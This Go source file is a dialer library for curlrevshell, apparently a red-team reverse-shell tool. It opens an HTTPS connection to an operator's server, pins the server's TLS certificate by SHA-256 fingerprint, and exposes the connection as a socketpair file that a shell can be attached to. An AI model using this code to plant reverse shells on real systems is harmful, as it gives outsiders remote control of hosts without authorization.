// Package crsdialer - Easy dialer to connect to curlrevshell
package crsdialer

/*
 * crsdialer.go
 * Easy dialer to connect to curlrevshell
 * By J. Stuart McMurray
 * Created 20250905
 * Last Modified 20250905
 */

import (
	"context"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"errors"
	"fmt"
	"io"
	"net/http"
	"os"
	"strings"
	"syscall"

	"github.com/magisterquis/curlrevshell/lib/sstls"
)

// SHA256Prefix is allowed but not required to be at the start of the
// fingerprint passed to Dial.
const SHA256Prefix = "sha256//"

// ErrNoMatchingCertificate indicates a TLS connection's peer did not present
// a certificate matching a configured fingerprint.
var ErrNoMatchingCertificate = errors.New(
	"no certificate with correct fingerprint found",
)

// Dial connects to curlrevshell at the given server HTTPS URL.  The server's
// TLS certificate is expected to have the give fingerprint as printed by
// curlrevshell, though it allowed to omit SHA256Prefix.
// The returned os.File, which is really a socketpair, is proxied to and from
// the HTTPS connection, which will be closed when the os.File is closed or the
// context is done.
func Dial(ctx context.Context, serverURL, fingerprint string) (
	*os.File,
	error,
) {
	/* Make sure we have all the relevant bits. */
	if "" == serverURL {
		return nil, errors.New("server URL cannot be empty")
	}
	if "" == fingerprint {
		return nil, errors.New("server fingerprint cannot be empty")
	}

	/* Pair of sockets. */
	fds, err := syscall.Socketpair(syscall.AF_UNIX, syscall.SOCK_STREAM, 0)
	if nil != err {
		return nil, fmt.Errorf("creating socket pair: %w", err)
	}
	cSock := os.NewFile(uintptr(fds[0]), "socket(client)")
	sSock := os.NewFile(uintptr(fds[1]), "socket(server)")
	var ok bool
	defer func() {
		if ok {
			return
		}
		cSock.Close()
		sSock.Close()
	}()

	/* Roll an HTTP client. */
	vfp, err := TLSFingerprintVerifier(fingerprint)
	if nil != err {
		return nil, fmt.Errorf(
			"setting up TLS fingerprint verification: %w",
			err,
		)
	}
	transport := http.DefaultTransport.(*http.Transport).Clone()
	transport.TLSClientConfig = &tls.Config{
		InsecureSkipVerify: true,
		VerifyConnection:   vfp,
	}
	transport.ForceAttemptHTTP2 = true
	client := &http.Client{Transport: transport}

	/* Send forth a request. */
	req, err := http.NewRequestWithContext(
		ctx,
		http.MethodPost,
		serverURL,
		sSock,
	)
	if nil != err {
		return nil, fmt.Errorf("initializing HTTPS request: %w", err)
	}
	res, err := client.Do(req)
	if nil != err {
		return nil, fmt.Errorf("sending HTTPS request: %w", err)
	}
	if http.StatusOK != res.StatusCode {
		res.Body.Close()
		return nil, fmt.Errorf("non-OK response status: %s", res.Status)
	}

	/* Proxy from the body to the socketpair. */
	go func() {
		defer res.Body.Close()
		defer cSock.Close()
		defer sSock.Close()
		io.Copy(sSock, res.Body)
	}()
	ok = true

	return cSock, nil
}

// TLSFingerprintVerifier returns a function which can be used for
// [tls.Config.VerifyConnection].  It ensures the peer presents a certificate
// with the given fingerprint, which must be a base64-encoded sha256 hash as
// used by curl, with or without the leading sha256//.
func TLSFingerprintVerifier(wantFP string) (
	func(tls.ConnectionState) error,
	error,
) {
	/* Don't need the prefix. */
	wantFP = strings.TrimPrefix(wantFP, SHA256Prefix)
	/* Make sure the fingerprint looks correct. */
	if b, err := base64.StdEncoding.DecodeString(wantFP); nil != err {
		return nil, fmt.Errorf("decoding fingerprint: %w", err)
	} else if sha256.Size != len(b) {
		return nil, fmt.Errorf(
			"decoded fingerprint not %d bytes",
			sha256.Size,
		)
	}

	/* Return a function to check if any of the certs in
	cs.PeerCertificates have the right hash. */
	return func(cs tls.ConnectionState) error {
		/* Check ALL the certs. */
		for i, cert := range cs.PeerCertificates {
			/* Hash the server's cert. */
			gotFP, err := sstls.PubkeyFingerprint(cert)
			if nil != err {
				return fmt.Errorf(
					"getting fingerprint for server "+
						"certificate %d/%d: %w",
					i+1, len(cs.PeerCertificates),
					err,
				)
			}

			/* See if it matches. */
			if gotFP == wantFP {
				return nil
			}
		}
		return ErrNoMatchingCertificate
	}, nil
}
